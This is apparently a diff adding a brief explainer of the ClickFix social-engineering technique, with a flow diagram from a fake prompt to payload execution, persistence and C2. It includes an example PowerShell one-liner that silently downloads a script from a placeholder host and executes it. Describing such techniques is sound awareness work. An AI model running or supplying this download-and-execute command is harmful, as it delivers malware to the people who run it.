@@ -1,0 +1,49 @@
+ClickFix = Social engineering --> user runs command --> script downloads malware --> 
+           payload executes --> Attacker gains access.
+
+Step-by-step flow:
+===================================================
+Fake website/email
+      ↓
+"Press Win + R"
+      ↓
+User pastes command
+      ↓
+PowerShell / CMD runs
+      ↓
+Downloader script executes
+      ↓
+Payload downloaded
+      ↓
+Payload executed
+      ↓
+Persistence + C2
+
+=========================================================
+ClickFix Command [ Example ]
+
+powershell -w hidden -nop -ep bypass -c "iwr http://bad.site/payload.ps1 | iex"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
